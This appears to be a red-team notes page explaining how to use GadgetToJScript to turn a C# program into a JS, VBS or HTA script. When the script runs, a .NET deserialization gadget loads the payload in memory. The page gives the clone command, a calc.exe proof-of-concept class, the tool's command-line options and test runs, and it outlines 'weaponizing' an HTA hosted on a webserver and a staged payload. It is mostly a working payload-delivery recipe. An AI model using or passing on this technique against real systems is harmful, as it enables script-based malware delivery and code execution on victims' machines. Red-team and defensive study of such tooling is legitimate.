# GadjetToJScript

## GadjetToJScript

### About

In a nutshell, GadgetToJScript serializes .Net assembly which then can trigger load/execution of a payload in memory.

Deserialization of this .NET assembly is done using  BinaryFormatter form JS/VBS based script.

The gadget are triggering a call to Assembly.Load during the deserialization  which can be used to load the code in memory.

### Usage

#### Download GadgetToJScript

```cpp
git clone https://github.com/rasta-mouse/GadgetToJScript
```

#### Create a C\# program which use a public class and a public method. Use the same name for the class and the method :

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class GtJ
{
    
        public GtJ()
        {
            Process.Start("calc.exe");
        }
    
}
```

```csharp
GadgetToJScript.exe -i my_program.cs -w js -r reference_assemblies -o myoutput -f

-w, --scriptType=VALUE js, vbs, vba or hta
-e, --encodeType=VALUE VBA gadgets encoding: b64 or hex (default set to b64)
-o, --output=VALUE Generated payload output file, example: C:\Users\userX\Desktop\output (Without extension)
-r, --regfree registration-free activation of .NET based COM components
-h, --help=VALUE Show Help
-r = reference. For instance, if we need msgbox (forms), we need to add the reference this way : -r System.Windows.Forms.dll
```

### Test your payload

![](../../../.gitbook/assets/image%20%28147%29.png)

```text
wscript.exe gtj_cal_out.js
cscript.exe gtj_cal_out.js

```

![](../../../.gitbook/assets/image%20%28110%29.png)

### HTA calc weaponization !

#### Copy the whole thing into a HTA file and host it on a webserver

![](../../../.gitbook/assets/image%20%2874%29.png)

### HTA staged payload

![](../../../.gitbook/assets/image%20%28104%29.png)

```text
.\GadgetToJScript.exe -i .\GtJsh.cs -w js -f -o GtJsh
```

### Resources

{% embed url="https://rastamouse.me/blog/gadgettojscript/" %}

{% embed url="https://github.com/rasta-mouse/GadgetToJScript/" %}

